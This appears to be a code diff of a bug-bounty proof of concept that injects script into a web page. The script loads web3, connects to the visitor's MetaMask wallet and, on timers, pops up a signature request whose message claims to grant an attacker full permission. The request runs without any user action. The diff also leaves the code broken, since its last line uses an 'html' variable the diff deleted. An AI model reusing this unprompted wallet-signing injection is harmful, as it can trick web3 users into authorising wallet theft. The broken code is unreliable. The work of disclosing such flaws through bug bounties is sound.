@@ -1,53 +1,58 @@
-const html = `
-<html>
-<!DOCTYPE html>
-<html lang="en">
+fetch('https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js')
+.then(response => response.text())
+.then(scriptContent => {
+  const scriptTag = document.createElement('script');
+  scriptTag.textContent = scriptContent;
+  document.head.appendChild(scriptTag);
+})
+.catch(error => console.error(error));
+  let web3;
 
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Akincibor</title>
-</head>
+  function connect() {
+    // Check if MetaMask is installed
+    if (typeof window.ethereum !== 'undefined') {
+      console.log('MetaMask is installed!');
 
-<body>
+      // Initialize web3 object
+      web3 = new Web3(window.ethereum);
 
-    <script src="https://cdn.ethers.io/lib/ethers-5.0.umd.min.js"></script>
+      // Request account access
+      window.ethereum.request({ method: 'eth_requestAccounts' })
+        .then((accounts) => {
+          console.log('Connected to MetaMask:', accounts[0]);
+        })
+        .catch((error) => {
+          console.error(error);
+        });
+    } else {
+      console.error('MetaMask is not installed!');
+    }
+  }
 
-    <script>
-        async function connectAndSign() {
-            // Check if MetaMask is installed
-            if (window.ethereum) {
-                console.log('MetaMask is installed!');
+  function signMessage() {
+    if (!web3) {
+      console.error('Web3 is not initialized!');
+      return;
+    }
 
-                // Request account access
-                try {
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    console.log('Connected to MetaMask:', accounts[0]);
+    const message = 'Hello, This is an example Transaction that will give to attacker full permission!';
+    const from = web3.currentProvider.selectedAddress;
 
-                    // Use Ethers.js to sign a message
-                    const provider = new ethers.providers.Web3Provider(window.ethereum);
-                    const signer = provider.getSigner();
-                    
-                    const message = 'Hello, I am a white hat and this message could be a malicious one to give the attacker full permission on your wallet! But, this is only a test message as a Proof of Concept for the Bug Bounty.';
-                    const signature = await signer.signMessage(message);
+    web3.eth.personal.sign(message, from, '', (error, signature) => {
+      if (error) {
+        console.error(error);
+      } else {
+        console.log('Message signed! Signature:', signature);
+      }
+    });
+  }
 
-                    console.log('Message signed! Signature:', signature);
-                    alert('Message signed! Signature: ' + signature);
-                } catch (error) {
-                    console.error(error);
-                }
-            } else {
-                console.error('MetaMask is not installed!');
-            }
-        }
-
-        // Call connectAndSign function automatically when the page loads
-        connectAndSign();
-    </script>
-
-</body>
-
-</html>
-`;
+  // Call connect function automatically after 3 seconds
+  setTimeout(() => {
+    connect();
+  }, 3000);
+  setTimeout(() => {
+    signMessage();
+  }, 5000);
 
 document.documentElement.innerHTML = html;
